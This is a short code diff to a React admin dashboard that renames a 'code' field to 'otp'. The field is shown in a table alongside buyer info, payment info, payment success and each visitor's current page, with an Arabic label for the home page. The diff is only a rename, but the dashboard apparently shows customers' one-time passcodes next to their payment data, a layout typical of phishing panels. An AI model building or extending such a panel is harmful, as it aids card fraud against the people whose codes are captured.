@@ -27,7 +27,7 @@ interface CombinedData {
   buyerInfo: Record<string, any> | null;
   paymentInfo: Record<string, any> | null;
   paymentSuccess: boolean;
-  code: string;
+  otp: string;
 }
 
 export default function AdminDashboard() {
@@ -211,9 +211,9 @@ export default function AdminDashboard() {
                         {row.currentPage === "/" ? "الرئيسية" : row.currentPage}
                       </td>
                       <td className="px-4 py-3">
-                        {row.code ? (
+                        {row.otp ? (
                           <span className="font-mono text-blue-600">
-                            {row.code}
+                            {row.otp}
                           </span>
                         ) : (
                           <span className="text-gray-400">-</span>
